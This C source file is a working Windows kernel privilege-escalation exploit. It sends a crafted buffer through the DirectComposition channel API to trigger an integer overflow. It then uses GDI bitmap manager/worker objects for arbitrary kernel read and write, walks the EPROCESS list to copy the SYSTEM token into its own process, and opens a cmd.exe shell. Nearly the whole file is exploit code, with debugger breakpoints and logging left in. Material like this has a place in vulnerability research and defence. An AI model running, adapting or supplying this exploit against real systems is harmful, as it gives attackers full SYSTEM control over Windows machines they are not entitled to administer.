#pragma once

#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <winternl.h>
#include <strsafe.h>
#include <assert.h>
#include <conio.h>

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _LeakBitmapInfo {
	HBITMAP hBitmap;
	PUCHAR pBitmap;
	PUCHAR pBitmapPvScan0;
} LeakBitmapInfo, *pLeakBitmapInfo;

typedef struct _USER_HANDLE_ENTRY {
	void    *pKernel;
	union
	{
		PVOID pi;
		PVOID pti;
		PVOID ppi;
	};
	BYTE type;
	BYTE flags;
	WORD generation;
} USER_HANDLE_ENTRY, *PUSER_HANDLE_ENTRY;

typedef struct _SERVERINFO {
	DWORD dwSRVIFlags;
	DWORD cHandleEntries;
	WORD wSRVIFlags;
	WORD wRIPPID;
	WORD wRIPError;
} SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO psi;
	PUSER_HANDLE_ENTRY aheList;
	ULONG HeEntrySize;
	ULONG_PTR pDispInfo;
	ULONG_PTR ulSharedDelts;
	ULONG_PTR awmControl;
	ULONG_PTR DefWindowMsgs;
	ULONG_PTR DefWindowSpecMsgs;
} SHAREDINFO, *PSHAREDINFO;

typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef struct _HEAD
{
	HANDLE h;
	DWORD  cLockObj;
} HEAD, *PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
} THROBJHEAD, *PTHROBJHEAD;
//
typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID    rpdesk;
	PVOID       pSelf;   // points to the kernel mode address
} THRDESKHEAD, *PTHRDESKHEAD;

enum DCPROCESSCOMMANDID
{
	nCmdProcessCommandBufferIterator,
	nCmdCreateResource,
	nCmdOpenSharedResource,
	nCmdReleaseResource,
	nCmdGetAnimationTime,
	nCmdCapturePointer,
	nCmdOpenSharedResourceHandle,
	nCmdSetResourceCallbackId,
	nCmdSetResourceIntegerProperty,
	nCmdSetResourceFloatProperty,
	nCmdSetResourceHandleProperty,
	nCmdSetResourceBufferProperty,
	nCmdSetResourceReferenceProperty,
	nCmdSetResourceReferenceArrayProperty,
	nCmdSetResourceAnimationProperty,
	nCmdSetResourceDeletedNotificationTag,
	nCmdAddVisualChild,
	nCmdRedirectMouseToHwnd,
	nCmdSetVisualInputSink,
	nCmdRemoveVisualChild
};

typedef NTSTATUS
	(NTAPI *NtDCompositionCreateChannel_t)(
	OUT PHANDLE pArgChannelHandle,
	IN OUT PSIZE_T pArgSectionSize,
	OUT PVOID* pArgSectionBaseMapInProcess
	);
typedef NTSTATUS
	(NTAPI
	*NtDCompositionProcessChannelBatchBuffer_t)(
	IN HANDLE hChannel,
	IN DWORD dwArgStart,
	OUT PDWORD pOutArg1,
	OUT PDWORD pOutArg2);


typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;
#define MAX_LOG_MESSAGE 1024

BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{
	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}

LONG BitmapArbitraryRead(HBITMAP hManager, HBITMAP hWorker, PVOID lpReadAddress, PVOID lpReadResult, DWORD dwReadLen)
{
	SetBitmapBits(hManager, dwReadLen, &lpReadAddress);		// Set Workers pvScan0 to the Address we want to read. 
	return GetBitmapBits(hWorker, dwReadLen, lpReadResult); // Use Worker to Read result into lpReadResult Pointer.
}


LONG BitmapArbitraryWrite(HBITMAP hManager, HBITMAP hWorker, PVOID lpWriteAddress, PVOID lpWriteValue, DWORD dwWriteLen)
{
	SetBitmapBits(hManager, dwWriteLen, &lpWriteAddress);     // Set Workers pvScan0 to the Address we want to write.
	return SetBitmapBits(hWorker, dwWriteLen, &lpWriteValue); // Use Worker to Write at Arbitrary Kernel address.
}


HBITMAP createBitmapOfSize(int size) {
	/*
	# size is EXCLUDING header, i.e. if we want 0x400 on pool we will allocate 0x3f0 (+0x10 will be header)
	# the minimum size is 0x390!
	CreateBitmap(1, x, 1, 1, 0);
	- with x == 0x44 => alloc 0x380 (== 0x390 on pool)
	- with x == 0x48 => alloc 0x390 (== 0x3a0 on pool)
	- with x == 0x4c => alloc 0x3a0 (== 0x3b0 on pool)
	if we want to alloc 0x3b0 on pool we need 0x3a0 for PALLOCMEM2
	=> (0x3b0 - 0x380) / 0x10 = 3
	pass 0x44 + (3-1)*4 as param
	*/
	if (size < 0x390) {
		printf("bad size! can't allocate bitmap of size < 0x390!\n");
		return 0;
	}
	if (size % 0x10) {
		printf("bad size! must be a multiple of 0x10!\n");
		return 0;
	}
	int cnt = (size - 0x380) / 0x10;
	return CreateBitmap(1, 0x44 + cnt * 4, 1, 32, 0);
}

LeakBitmapInfo GDIReloaded(LPCWSTR lpBitmapName, DWORD dwOffsetToPvScan0)
{
	LeakBitmapInfo BitmapInfo;
	DWORD dwCounter = 0;
	HACCEL hAccel;							// Handle to Accelerator table 
	LPACCEL lpAccel;						// Pointer to Accelerator table Array
	PUSER_HANDLE_ENTRY AddressA = NULL;
	PUSER_HANDLE_ENTRY AddressB = NULL;
	PUCHAR pAcceleratorAddrA = NULL;
	PUCHAR pAcceleratorAddrB = NULL;

	PSHAREDINFO pSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle(L"user32.dll"), "gSharedInfo");
	PUSER_HANDLE_ENTRY gHandleTable = pSharedInfo->aheList;
	DWORD index;

	// Allocate Memory for the Accelerator Array
	lpAccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL)*796);

	while (dwCounter < 20) {
		//__debugbreak();
		hAccel = CreateAcceleratorTable(lpAccel, 796);
		index = LOWORD(hAccel);
		AddressA = &gHandleTable[index];
		pAcceleratorAddrA = (PUCHAR)AddressA->pKernel;
		DestroyAcceleratorTable(hAccel);

		hAccel = CreateAcceleratorTable(lpAccel, 796);
		index = LOWORD(hAccel);
		AddressB = &gHandleTable[index];
		pAcceleratorAddrB = (PUCHAR)AddressB->pKernel;
		__debugbreak();
		if (pAcceleratorAddrA == pAcceleratorAddrB) {
			DestroyAcceleratorTable(hAccel);
			LPVOID lpBuf = VirtualAlloc(NULL, 0x50 * 2 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			//__debugbreak();
			BitmapInfo.hBitmap = CreateBitmap(0x200, 0x45, 1, 1, 0); // nHeight should be 0x45
			break;
		}
		DestroyAcceleratorTable(hAccel);
		dwCounter++;
	}
	//__debugbreak();
	BitmapInfo.pBitmap = pAcceleratorAddrA;
	BitmapInfo.pBitmapPvScan0 = pAcceleratorAddrA + dwOffsetToPvScan0;
	LogMessage(L_INFO,TEXT("Duplicate AcceleratorTable Address: 0x%p"), BitmapInfo.pBitmap);
	LogMessage(L_INFO,TEXT("%ls Bitmap Handle at: 0x%08x"), lpBitmapName, (ULONG)BitmapInfo.hBitmap);
	LogMessage(L_INFO,TEXT("%ls Bitmap pvScan0 Pointer: 0x%p"), lpBitmapName, BitmapInfo.pBitmapPvScan0);

	return BitmapInfo;
}

FARPROC WINAPI KernelSymbolInfo(LPCSTR lpSymbolName)
{
	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	LPVOID kernelBase = NULL;
	PUCHAR kernelImage = NULL;
	HMODULE hUserSpaceKernel;
	LPCSTR lpKernelName = NULL;
	FARPROC pUserKernelSymbol = NULL;
	FARPROC pLiveFunctionAddress = NULL;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	kernelBase = ModuleInfo->Module[0].ImageBase;
	kernelImage = ModuleInfo->Module[0].FullPathName;

	/* Find exported Kernel Functions */

	lpKernelName = (LPCSTR)ModuleInfo->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName;

	hUserSpaceKernel = LoadLibraryExA(lpKernelName, 0, 0);
	if (hUserSpaceKernel == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	pUserKernelSymbol = GetProcAddress(hUserSpaceKernel, lpSymbolName);
	if (pUserKernelSymbol == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpaceKernel + (PUCHAR)kernelBase);

	FreeLibrary(hUserSpaceKernel);
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return pLiveFunctionAddress;
}

void PopShell()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
}



int main(int argc, TCHAR* argv[])
{
	short a = 10;
	int b = 20;
	long c = 30;
	a = b;
	a = c;
	b = c;

	HANDLE hChannel;
	NTSTATUS ntStatus;
	SIZE_T SectionSize = 0x1000;
	PVOID pMappedAddress = NULL;
	DWORD dwArg1, dwArg2;
	HANDLE hResource = (HANDLE)1;
	LeakBitmapInfo ManagerBitmap;
	LeakBitmapInfo WorkerBitmap;
	DWORD dwOffsetToPvScan0 = 0x30;
	LPCSTR lpFunctionName = "PsInitialSystemProcess";
	FARPROC fpFunctionAddress = NULL;

	LoadLibrary(TEXT("user32"));
	HMODULE hNtdll;

	hNtdll = GetModuleHandleA("ntdll.dll");
	NtDCompositionCreateChannel_t NtDCompositionCreateChannel;
	NtDCompositionProcessChannelBatchBuffer_t NtDCompositionProcessChannelBatchBuffer;
	NtDCompositionCreateChannel = (NtDCompositionCreateChannel_t)GetProcAddress(GetModuleHandle(L"win32u.dll"), "NtDCompositionCreateChannel");
	NtDCompositionProcessChannelBatchBuffer = (NtDCompositionProcessChannelBatchBuffer_t)GetProcAddress(GetModuleHandle(L"win32u.dll"), "NtDCompositionProcessChannelBatchBuffer");

	//
	// convert to gui thread
	//

	LoadLibrary(TEXT("user32"));

	//
	// create a new channel
	//

	ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
	if (!NT_SUCCESS(ntStatus)){
		LogMessage(L_ERROR, TEXT("Create channel error code:0x%08x"), ntStatus);
		return -1;
	}

	LogMessage(L_INFO, TEXT("Create channel ok, channel=0x%x"), hChannel);

	//
	// create a new resource with type - CPropertyBagMarshaler
	//

	*(DWORD*)(pMappedAddress) = nCmdCreateResource;
	*(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)hResource;
	*(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x70;
	*(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;

	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
	if (!NT_SUCCESS(ntStatus)) {
		LogMessage(L_ERROR, TEXT("Create resource error code:0x%08x"), ntStatus);
		return -1;
	}
	//__debugbreak();
	//CreateBitmap(0x200,0x45,1,1,0);

	ManagerBitmap = GDIReloaded(L"Manager", dwOffsetToPvScan0);
	LogMessage(L_INFO,TEXT("0x%x ManagerBitmap Kernel Address : 0x%08x"),ManagerBitmap.hBitmap,ManagerBitmap.pBitmap);
	WorkerBitmap = GDIReloaded(L"Worker", dwOffsetToPvScan0);
	LogMessage(L_INFO,TEXT("0x%x WorkerBitmap Kernel Address : 0x%08x"),WorkerBitmap.hBitmap,WorkerBitmap.pBitmap);

	DWORD lpFakeSize = 0x45;
	PVOID lpFakeBitmapHeight = ManagerBitmap.pBitmapPvScan0 - 0xc;
	PVOID lpFakeWorkerBitmapPvscan0 = WorkerBitmap.pBitmapPvScan0;
	PVOID lpFakeBitmapElement_1 = (PVOID)0x40;
	PVOID lpFakeBitmapElement_2 = (PVOID)0x3394;
	PVOID lpFakeBitmapElement_3 = (PVOID)0x1;
	//
	// set argument of NtDCompositionProcessChannelBatchBuffer
	//

	UCHAR szBuff[] = { 0x2d, 0xf7, 0xde, 0x71, 0x14, 0x07, 0xac, 0x58, 0xe4, 0x19, 0xd8, 0x64, 0x36, 0xf2, 0x0f, 0x71,
		0x1c, 0x4f, 0x3c, 0xac, 0x85, 0xa5, 0x3d, 0xea, 0x2e, 0xfc, 0x8b, 0xca, 0xe9, 0xb6, 0xbf, 0x7b,
		0xc0, 0x5d, 0xbc, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x18, 0x3d, 0x3e, 0x96, 0x2e, 0xaf, 0x1c, 0x90,
		0x90, 0x51, 0x64, 0x1a, 0xdc, 0xa3, 0x0c, 0x8e, 0xee, 0x1d, 0xd2, 0x71, 0xa5, 0xf4, 0x60, 0x7b,
		0x08, 0xe1, 0x16, 0xf1, 0xd5, 0x29, 0x53, 0xee, 0xe6, 0xdc, 0x3c, 0xcb, 0xf8, 0x64, 0x5e, 0xb0,
		0x2e, 0x95, 0x73, 0xba };

	CopyMemory(szBuff+0x8, &lpFakeBitmapHeight,0x4);
	CopyMemory(szBuff+0xC, &lpFakeSize, 0x4);
	CopyMemory(szBuff+0x10, &lpFakeWorkerBitmapPvscan0,0x4);
	CopyMemory(szBuff+0x14, &lpFakeBitmapElement_1,0x4);
	CopyMemory(szBuff+0x18, &lpFakeBitmapElement_2,0x4);
	CopyMemory(szBuff+0x1C, &lpFakeBitmapElement_3,0x4);
	*(DWORD*)pMappedAddress = nCmdSetResourceBufferProperty;
	*(HANDLE*)((PUCHAR)pMappedAddress + 4) = hResource;
	*(DWORD*)((PUCHAR)pMappedAddress + 8) = 1;
	//*(DWORD*)((PUCHAR)pMappedAddress + 0xc) = sizeof(szBuff);
	*(DWORD*)((PUCHAR)pMappedAddress + 0xc) = 0x20;
	CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, sizeof(szBuff));


	//
	// call the function
	//

	LogMessage(L_INFO, TEXT("NtDCompositionSetResourceBufferProperty(0x%x, 0x%x, 0x%x, buf, 0x%x)"), hChannel,
		hResource, 1, sizeof(szBuff));
	LogMessage(L_INFO, TEXT("Trigger IntegerOverflow..."));
	//__debugbreak();
	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x14 + sizeof(szBuff), &dwArg1, &dwArg2);

	LogMessage(L_INFO, TEXT("Stealing TOKEN start..."));
	__debugbreak();
	fpFunctionAddress = KernelSymbolInfo(lpFunctionName);
	if (fpFunctionAddress == NULL)
	{
		LogMessage(L_ERROR, TEXT("Get Kernel Symbol Info Error!"));
		exit(0);
	}

	LogMessage(L_INFO,TEXT("%hs Address is at: 0x%p"), lpFunctionName, (LPVOID)fpFunctionAddress);

	//found system token 
	PVOID lpSystemEPROCESS = NULL;
	PVOID lpSysProcID = NULL;
	LIST_ENTRY leNextProcessLink;
	PVOID lpSystemToken = NULL;
	DWORD dwUniqueProcessIdOffset = 0x0b4;
	DWORD dwTokenOffset = 0x0f4;
	DWORD dwActiveProcessLinks = 0x0b8;
	DWORD dwPID;
	__debugbreak();
	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PVOID)fpFunctionAddress, &lpSystemEPROCESS, sizeof(PVOID));
	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpSystemEPROCESS + dwUniqueProcessIdOffset, &lpSysProcID, sizeof(PVOID));
	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpSystemEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));
	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpSystemEPROCESS + dwTokenOffset, &lpSystemToken, sizeof(PVOID));
	LogMessage(L_INFO, TEXT("System Token is : 0x%p"),lpSystemToken);


	dwPID = GetCurrentProcessId();
	LogMessage(L_INFO, TEXT("Current Process PID is: %d"), dwPID);
	//found current process pid and token address
	LPVOID lpNextEPROCESS = NULL;
	LPVOID lpCurrentPID = NULL;
	LPVOID lpCurrentToken = NULL;
	DWORD dwCurrentPID;
	do {
		lpNextEPROCESS = (PUCHAR)leNextProcessLink.Flink - dwActiveProcessLinks;
		BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwUniqueProcessIdOffset, &lpCurrentPID, sizeof(LPVOID));
		BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwTokenOffset, &lpCurrentToken, sizeof(LPVOID));

		// Read _LIST_ENTRY to next Active _EPROCESS Structure
		BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));

		dwCurrentPID = LOWORD(lpCurrentPID);

	} while (dwCurrentPID != dwPID);

	LogMessage(L_INFO,TEXT("Current _EPROCESS Token address is at: 0x%p"), (PUCHAR)lpNextEPROCESS + dwTokenOffset);
	LogMessage(L_INFO,TEXT("Current Process Token is: 0x%p"), lpCurrentToken);

	BitmapArbitraryWrite(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwTokenOffset, lpSystemToken, sizeof(LPVOID));

	LogMessage(L_INFO, TEXT("Stealing Token success!!"));
	PopShell();

	return 0;
}